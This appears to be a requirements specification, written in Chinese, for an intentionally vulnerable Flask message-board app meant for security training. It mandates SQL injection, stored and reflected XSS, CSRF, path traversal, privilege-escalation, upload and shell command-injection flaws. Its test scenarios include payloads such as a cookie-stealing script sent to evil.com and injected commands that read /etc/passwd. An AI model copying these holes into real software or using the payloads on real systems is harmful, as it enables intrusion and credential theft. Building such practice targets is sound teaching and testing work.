## ADDED Requirements

### Requirement: 留言管理系统基础架构
应用 SHALL 实现一个留言管理系统，包含普通用户（user）和管理员（admin）两种角色，admin 账号预置于数据库，普通用户可注册。**留言内容以 `.txt` 文件形式存储在服务器 `messages/` 目录**，文件名格式为 `msg_<id>_<username>.txt`，同时在数据库中记录元数据（ID、用户、时间、文件路径）。系统包含登录/注册、留言板、用户管理（admin）、留言文件管理（admin）、文件管理、个人设置共六个功能模块。

#### Scenario: 普通用户登录后只能访问留言板和个人设置
- **WHEN** 普通用户登录成功
- **THEN** 导航栏显示留言板、搜索、个人设置，不显示用户管理和系统工具入口

#### Scenario: admin 登录后可访问全部功能
- **WHEN** admin 账号登录成功
- **THEN** 导航栏额外显示用户管理和系统工具入口

### Requirement: 登录功能含 SQL 注入漏洞
应用 SHALL 提供用户名/密码登录页面，后端使用字符串拼接构造 SQL 查询，使攻击者可通过注入语句绕过认证。

#### Scenario: SQL 注入绕过登录
- **WHEN** 用户在用户名字段输入 `admin' --` 并提交任意密码
- **THEN** 系统不验证密码直接以 admin 身份登录成功

#### Scenario: UNION 注入泄露用户表数据
- **WHEN** 搜索框输入 `' UNION SELECT username,password,3 FROM users --`
- **THEN** 页面返回数据库中所有用户的用户名和密码哈希

### Requirement: 留言板含存储型 XSS 漏洞
应用 SHALL 提供留言发布功能，用户提交的留言内容直接存入数据库并原样渲染到 HTML，不做任何转义。

#### Scenario: 存储型 XSS 注入并持久执行
- **WHEN** 用户提交留言内容 `<script>document.location='http://evil.com/steal?c='+document.cookie</script>`
- **THEN** 该脚本被存储，其他用户访问留言板时脚本自动执行

### Requirement: 搜索功能含反射型 XSS 漏洞
应用 SHALL 提供留言搜索功能，将 URL 参数 `q` 的值直接反射到响应页面的"搜索结果"提示中，不做转义。

#### Scenario: 反射型 XSS 触发
- **WHEN** 用户访问 `/search?q=<img src=x onerror=alert(document.cookie)>`
- **THEN** 页面直接输出该标签并执行 onerror 事件

### Requirement: 修改密码和删除留言缺少 CSRF 防护
应用 SHALL 的修改密码表单和删除留言操作不包含 CSRF Token，允许跨站伪造请求。

#### Scenario: CSRF 伪造修改密码
- **WHEN** 已登录用户访问包含伪造修改密码表单的恶意页面并触发提交
- **THEN** 服务器接受请求并修改用户密码，无任何 Token 校验失败提示

### Requirement: 文件下载含路径穿越漏洞
应用 SHALL 提供文件下载接口，接受 `filename` 参数并直接拼接到文件路径，不做路径规范化。

#### Scenario: 路径穿越读取应用源码
- **WHEN** 用户请求 `/download?filename=../../app.py`
- **THEN** 服务器返回应用源码文件内容

### Requirement: 水平越权漏洞
应用 SHALL 的留言查看/删除接口通过 URL 参数 `msg_id` 指定目标，不校验该留言是否属于当前登录用户。

#### Scenario: 普通用户删除他人留言
- **WHEN** 普通用户 A 发送 DELETE 请求 `/message/delete?msg_id=<用户B的留言ID>`
- **THEN** 服务器删除用户 B 的留言，不返回权限错误

### Requirement: 垂直越权漏洞
应用 SHALL 的 admin 专属接口（用户管理、系统工具）仅通过前端隐藏入口限制访问，后端不校验用户角色。

#### Scenario: 普通用户直接访问 admin 接口
- **WHEN** 普通用户直接请求 `/admin/users` 或 `/admin/messages`
- **THEN** 服务器返回 admin 功能页面，不返回 403

### Requirement: 不安全文件上传漏洞
应用 SHALL 提供头像上传功能，不校验文件扩展名和 MIME 类型，允许上传任意文件。

#### Scenario: 上传可执行脚本文件
- **WHEN** 用户上传一个扩展名为 `.py` 的文件
- **THEN** 服务器接受并保存该文件，返回上传成功

### Requirement: admin 删除留言文件接口含命令注入漏洞
应用 SHALL 提供 admin 专属的留言文件删除接口，接受 `filename` 参数，后端通过 `subprocess.run("rm messages/" + filename, shell=True)` 执行删除操作，不对 `filename` 做任何过滤，允许攻击者注入任意 shell 命令。

#### Scenario: 命令注入执行任意命令
- **WHEN** admin 提交删除请求，`filename` 为 `msg_001.txt; id`
- **THEN** 服务器执行 `rm messages/msg_001.txt; id`，页面返回输出中包含当前用户信息

#### Scenario: 命令注入读取敏感文件
- **WHEN** admin 提交 `filename=msg_001.txt && cat /etc/passwd`
- **THEN** 服务器执行后页面返回 `/etc/passwd` 文件内容

### Requirement: 错误页面含敏感信息泄露
应用 SHALL 在发生异常时直接返回 Flask 默认调试页面，暴露完整堆栈信息、文件路径和代码片段。

#### Scenario: 触发异常暴露堆栈信息
- **WHEN** 用户构造触发异常的请求（如传入非法参数类型）
- **THEN** 页面返回包含文件路径、代码行号、变量值的完整调试信息

### Requirement: 登录接口无频率限制（弱口令/暴力破解）
应用 SHALL 的登录接口不限制同一 IP 的请求频率，允许无限次尝试密码。

#### Scenario: 暴力破解登录
- **WHEN** 攻击者对同一账号连续发送 100 次错误密码请求
- **THEN** 服务器全部正常响应，不触发锁定或验证码
